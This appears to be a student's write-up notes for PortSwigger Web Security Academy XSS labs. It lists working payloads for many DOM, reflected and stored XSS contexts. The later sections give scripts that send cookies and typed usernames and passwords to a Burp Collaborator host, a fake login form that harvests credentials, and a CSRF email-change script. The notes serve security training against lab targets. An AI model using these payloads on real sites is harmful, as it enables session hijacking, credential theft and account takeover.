
# Cross Site Scripting (XSS)
## DOM XSS

### Apprentice

#### DOM XSS in `document.write` sink using source `location.search`

https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink

https://portswigger.net/web-security/cross-site-scripting/dom-based

In the source code, it shows that there is no escaping of the query string. This means that you can inject HTML markup

```html
<script>
    function trackSearch(query) {
        document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
    }
    var query = (new URLSearchParams(window.location.search)).get('search');
    if(query) {
        trackSearch(query);
    }
</script>
```

![](Pasted%20image%2020220526085543.png)


To inject HTML tags, the payload I used is this

```
"><script>alert(1);</script>
```


#### DOM XSS in `innerHTML` sink using source `location.search`

Final Payload

```html
<img src=1 onerror=alert(document.domain)>
```

  
#### DOM XSS in jQuery anchor `href` attribute sink using `location.search` source


Source code in the feedback form at `/feedback`

```html
<form id="feedbackForm" action="/feedback/submit" method="POST" enctype="application/x-www-form-urlencoded">
    <input required type="hidden" name="csrf" value="rRaLC1LKcbSdftoImNi1B6R5VjgoKEwv">
    <label>Name:</label>
    <input required type="text" name="name">
    <label>Email:</label>
    <input required type="email" name="email">
    <label>Subject:</label>
    <input required type="text" name="subject">
    <label>Message:</label>
    <textarea required rows="12" cols="300" name="message"></textarea>
    <button class="button" type="submit">
        Submit feedback
    </button>
    <span id="feedbackResult"></span>
    <script src="/resources/js/jquery_1-8-2.js"></script>
    <div class="is-linkback">
        <a id="backLink">Back</a>
    </div>
    <script>
        $(function() {
            $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
        });
    </script>
</form>
```

Final Payload

```
<url>/feedback?returnPath=javascript:alert(document.domain)
```


####  DOM XSS in jQuery selector sink using a hashchange event

```html
<script>
    $(window).on('hashchange', function(){
        var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
        if (post) post.get(0).scrollIntoView();
    });
</script>
```


Final Payload on Exploit Server

```html
<iframe src="https://ac731ff41f11292cc003361300cd003f.web-security-academy.net/#" onload="this.src+='<img src=1 onerror=print()>'">
```

### Practitioner

#### DOM XSS in `document.write` sink using source `location.search` inside a select element
https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink-inside-select-element

Looking at a product listing, I notice some interesting source code

view-source:https://ac151fb61eae0f2bc00502da00f50042.web-security-academy.net/product?productId=1

```html
 <script>
    var stores = ["London","Paris","Milan"];
    var store = (new URLSearchParams(window.location.search)).get('storeId');
    document.write('<select name="storeId">');
    if(store) {
        document.write('<option selected>'+store+'</option>');
    }
    for(var i=0;i<stores.length;i++) {
        if(stores[i] === store) {
            continue;
        }
        document.write('<option>'+stores[i]+'</option>');
    }
    document.write('</select>');
</script>
```

Payload

```
<url>/product?productId=1&storeId=</option></select><script>alert(1);</script>
```


#### DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded

Just found a payload from [here](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/XSS%20in%20Angular.md)
```
{{constructor.constructor('alert(1)')()}}
```


#### Reflected DOM XSS

Found this script in the source code of the search results page

```html
<script src='resources/js/searchResults.js'></script>
<script>search('search-results')</script>
<section class="blog-header">
</section>
<section class=search>
    <form action=/ method=GET>
        <input type=text placeholder='Search the blog...' name=search>
        <button type=submit class=button>Search</button>
    </form>
</section>
```

```js

function search(path) {
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
            eval('var searchResultsObj = ' + this.responseText);
            displaySearchResults(searchResultsObj);
        }
    };
    xhr.open("GET", path + window.location.search);
    xhr.send();

    function displaySearchResults(searchResultsObj) {
        var blogHeader = document.getElementsByClassName("blog-header")[0];
        var blogList = document.getElementsByClassName("blog-list")[0];
        var searchTerm = searchResultsObj.searchTerm
        var searchResults = searchResultsObj.results

        var h1 = document.createElement("h1");
        h1.innerText = searchResults.length + " search results for '" + searchTerm + "'";
        blogHeader.appendChild(h1);
        var hr = document.createElement("hr");
        blogHeader.appendChild(hr)

        for (var i = 0; i < searchResults.length; ++i)
        {
            var searchResult = searchResults[i];
            if (searchResult.id) {
                var blogLink = document.createElement("a");
                blogLink.setAttribute("href", "/post?postId=" + searchResult.id);

                if (searchResult.headerImage) {
                    var headerImage = document.createElement("img");
                    headerImage.setAttribute("src", "/image/" + searchResult.headerImage);
                    blogLink.appendChild(headerImage);
                }

                blogList.appendChild(blogLink);
            }

            blogList.innerHTML += "<br/>";

            if (searchResult.title) {
                var title = document.createElement("h2");
                title.innerText = searchResult.title;
                blogList.appendChild(title);
            }

            if (searchResult.summary) {
                var summary = document.createElement("p");
                summary.innerText = searchResult.summary;
                blogList.appendChild(summary);
            }

            if (searchResult.id) {
                var viewPostButton = document.createElement("a");
                viewPostButton.setAttribute("class", "button is-small");
                viewPostButton.setAttribute("href", "/post?postId=" + searchResult.id);
                viewPostButton.innerText = "View post";
            }
        }

        var linkback = document.createElement("div");
        linkback.setAttribute("class", "is-linkback");
        var backToBlog = document.createElement("a");
        backToBlog.setAttribute("href", "/");
        backToBlog.innerText = "Back to Blog";
        linkback.appendChild(backToBlog);
        blogList.appendChild(linkback);
    }
}
```

Trying to access an endpoint

```json
(base) [hacker@hackerbook Blog]$ curl https://ac231f411fd4a209c05c2a6d00900031.web-security-academy.net/search-results?search=passwords -k| jq
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   234  100   234    0     0    148      0  0:00:01  0:00:01 --:--:--   148
{
  "results": [
    {
      "id": 3,
      "title": "Passwords",
      "image": "blog/posts/17.jpg",
      "summary": "There are three types of password users in the world; those who remember them, those who don't, and those who write them down."
    }
  ],
  "searchTerm": "passwords"
}
(base) [hacker@hackerbook Blog]$ curl https://ac231f411fd4a209c05c2a6d00900031.web-security-academy.net/search-results?search=passwords'"' -k| jq
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    41  100    41    0     0     21      0  0:00:01  0:00:01 --:--:--    21
{
  "results": [],
  "searchTerm": "passwords\""
}
(base) [hacker@hackerbook Blog]$ 
```

Looking at the searchTerm, maybe we can try to do some escaping

On looking at the solution, the \ is not escaped

```json
(base) [hacker@hackerbook Blog]$ curl https://acd61f3d1e31d8f8c0ba44e800d20003.web-security-academy.net/search-results?search=passwordshello\\'"\};alert(1);//' -k 
{"results":[],"searchTerm":"passwordshello\\"};alert(1);//"}(base) [hacker@hackerbook Blog]$ 
(base) [hacker@hackerbook Blog]$ 
```

Final Search Query

```
passwordshello\"};alert(1);//
```

#### Stored DOM XSS

Test 1: didn't work as expected, there may be some escaping needed

![](Pasted%20image%2020220526215517.png)
![](Pasted%20image%2020220526215538.png)

Test 2: HTML Code is injected
![](Pasted%20image%2020220526215734.png)


![](Pasted%20image%2020220526215853.png)


Test 3: Success

```
AAAA</script>BBBB<img src=1 onerror=alert(document.domain)>CCCC
```

![](Pasted%20image%2020220526220013.png)

![](Pasted%20image%2020220526220027.png)

## Cross-site scripting contexts



https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked
 - `<tag style='font-weight:bold;'>Data</tag>` works
 - `<iframe id='myFrame' src="https://acbe1f151f632a73c0c539c0006c00d8.web-security-academy.net/?search=%3Cbody+onresize%3Dprint%28%29%3E" onload='document.getElementById("myFrame").width = "400"'>`, store and run in the exploit server


`<xss id='x' tabindex=1 autofocus onfocus='alert(document.cookie);'> </xss>`
`<iframe autofocus id='myFrame' width="1000" height="1000" src="https://ac821f731ee8c8dbc025506100a80063.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29+tabindex%3D1#x" onload=''>`


https://portswigger.net/web-security/cross-site-scripting/contexts/lab-attribute-angle-brackets-html-encoded

https://ac721f721f272809c07a4bb3001000ed.web-security-academy.net/?search=%3Cscript%3Eprint%28%29%3B%3C%2Fscript%3E

Source code

```html
<section class=blog-header>
    <h1>0 search results for '&lt;script&gt;print();&lt;/script&gt;'</h1>
    <hr>
</section>
<section class=search>
    <form action=/ method=GET>
        <input type=text placeholder='Search the blog...' name=search value="&lt;script&gt;print();&lt;/script&gt;">
        <button type=submit class=button>Search</button>
    </form>
</section>
```

Final Payload

```
" autofocus onfocus=alert(document.domain) x='
```


https://portswigger.net/web-security/cross-site-scripting/contexts/lab-some-svg-markup-allowed

Just tried and error all svg tags

```
<svg><animatetransform onbegin=alert(1) attributeName=transform>
```

https://portswigger.net/web-security/cross-site-scripting/contexts/lab-href-attribute-double-quotes-html-encoded

![](Pasted%20image%2020220528160142.png)
![](Pasted%20image%2020220528160200.png)

https://portswigger.net/web-security/cross-site-scripting/contexts/lab-canonical-link-tag

In source code of post

```
<link rel="canonical" href='https://acd51fb31fe33721c02e9613009b004e.web-security-academy.net/post?postId=5'/>
```

Referenced Answer
```
<url>/?%27accesskey=%27x%27onclick=%27alert(1)
```

https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-single-quote-backslash-escaped
In search box
```
</script><img src=1 onerror=alert(document.domain)>
```

https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-html-encoded
In search box
```
'-alert(document.domain)-'
```

https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-double-quotes-encoded-single-quotes-escaped
In search box
```
\';alert(document.domain)//
```

https://portswigger.net/web-security/cross-site-scripting/contexts/lab-onclick-event-angle-brackets-double-quotes-html-encoded-single-quotes-backslash-escaped

Comment URL
```
https://&apos;-alert(document.domain)-&apos;
```


https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-template-literal-angle-brackets-single-double-quotes-backslash-backticks-escaped

In search box
```
${alert(document.domain)}
```


## Exploiting

### Stealing Web Cookies

https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies

At the blog post

```
<script>
var i = new Image();
i.src = "http:/6t0nytid2c7d6pt6jtmovaya319txi.burpcollaborator.net/get.php?q="+document.cookie;
</script></p>
```

![](https://i.imgur.com/SgheCnu.png)


`secret=3jihJMZHg9rrQLLuT0iYiXHwczLAaDPK;%20session=8SzKz0Lub7LoeJe96awjrbLfwyWMJUZk `

![](https://i.imgur.com/SSj1GG5.png)


### Exploiting cross-site scripting to capture passwords

https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-capturing-passwords

hg15cseqelc8lqjvusv69aecl3rtfi.burpcollaborator.net

```
<script>
var i = new Image();
i.src = "http:/hg15cseqelc8lqjvusv69aecl3rtfi.burpcollaborator.net/get.php?q="+document.cookie;
</script>
```

```
GET /get.php?q=secret=IpL2ImyUJjruE9Apjx3UjmkAcDqK8gy7 HTTP/1.1
Host: hg15cseqelc8lqjvusv69aecl3rtfi.burpcollaborator.net
Connection: keep-alive
sec-ch-ua: 
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
sec-ch-ua-platform: 
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: image
Referer: https://ac831fc81f6bafaec0bd448700b4002b.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US
```

Final Payload - Blog Post
1. 1 Blog post can only have 1 login (if not autofill how?)
2. onchange?

```
<p> Login Here! 817ashiw4kgujq6ffba8jouz3q9gx5.burpcollaborator.net
</p>

<script>
function stealCreds(){
      var user = document.getElementById('username').value;
      var pass = document.getElementById('password').value;
      var url = "http://817ashiw4kgujq6ffba8jouz3q9gx5.burpcollaborator.net/login?u=" + user + "&p=" + pass+"&cookie="+document.cookie;
      console.log(url);
      new Image().src=url;
    }
</script>
  
<h1>Login</h1>
<section>
    <form class=login-form method=POST action=/login>
        <input required type="hidden" name="csrf" value="dummycsrf">
        <label>Username</label>
        <input required type=username name="username" id="username" onchange="stealCreds()">
        <label>Password</label>
        <input required type=password name="password" id="password" onchange="stealCreds()">
        <button class=button type=submit onclick="stealCreds()""> Log in </button>
    </form>
</section>
```

```
GET /login?u=administrator&p=sqmxi2fwuv96j1zbdsrv&cookie=secret=IpL2ImyUJjruE9Apjx3UjmkAcDqK8gy7 HTTP/1.1
Host: 817ashiw4kgujq6ffba8jouz3q9gx5.burpcollaborator.net
Connection: keep-alive
sec-ch-ua: 
sec-ch-ua-mobile: ?0
```


Then just login `administrator`:`sqmxi2fwuv96j1zbdsrv`

### Exploiting XSS to perform CSRF

https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf

I logged in and found that the csrf token doesn't change
```
<form class="login-form" id="myForm" name="change-email-form" action="/my-account/change-email" method="POST">
<label>Email</label>
<input required type="email" name="email" value="pwned@evil-user.net">
<input required type="hidden" name="csrf" value="M1NzqWCPGSK6pEHZhSPb7YYPScehW4NQ">
<button class='button' type='submit'> Update email </button>
</form>
 </form> <script> document.forms["myForm"].submit(); </script>
```
I checked the solution and apparently the csrf token isn't static after all

Need to retrieve it
https://www.labnol.org/code/19233-submit-forms-with-javascript
```
<form class="login-form" id="myForm" name="change-email-form" action="/my-account/change-email" method="POST"  target="hidden-form" style="display:none">
<label>Email</label>
<input required type="email" name="email" value="pwned@evil-user.net">
<input required type="hidden" name="csrf" id="csrf" value=""> <!--M1NzqWCPGSK6pEHZhSPb7YYPScehW4NQ-->
<button class='button' type='submit'> Update email </button>
</form>
<iframe style="display:none" name="hidden-form"></iframe>
<script> 
var oReq = new XMLHttpRequest();
oReq.open("GET", "https://ac721f6b1e2d3879c0e1036f00bf00b5.web-security-academy.net/my-account");
//oReq.setRequestHeader('Cookie', document.cookie);
oReq.onload = function(e) {
    var rt = oReq.responseText;
    let re = /name="csrf" value="([A-Za-z0-9]+)"+/;
    console.log(rt);
    var tokens = rt.match(re);
    document.getElementById("csrf").value=tokens[1];
    console.log(tokens);
    document.forms["myForm"].submit(); 
}
oReq.send();
</script>
```


# Others